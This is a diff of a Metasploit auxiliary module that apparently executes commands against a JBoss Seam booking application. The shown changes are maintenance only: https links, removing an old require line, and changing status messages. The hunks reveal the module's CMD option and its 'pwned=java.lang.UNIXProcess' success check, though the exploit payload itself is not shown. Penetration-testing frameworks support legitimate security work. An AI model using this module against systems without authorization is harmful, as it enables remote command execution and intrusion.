@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -41,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8080),
         OptString.new('TARGETURI', [ true, 'Target URI', '/seam-booking/home.seam']),
         OptString.new('CMD', [ true, "The command to execute."])
-      ], self.class)
+      ])
   end
 
   def run
@@ -90,9 +87,9 @@ class MetasploitModule < Msf::Auxiliary
 
 
       if (res and res.headers['Location'] =~ %r(pwned=java.lang.UNIXProcess))
-        print_status("Exploited successfully")
+        print_good("Exploited successfully")
       else
-        print_status("Exploit failed.")
+        print_error("Exploit failed")
       end
     else
       print_error("Target appears not vulnerable!")
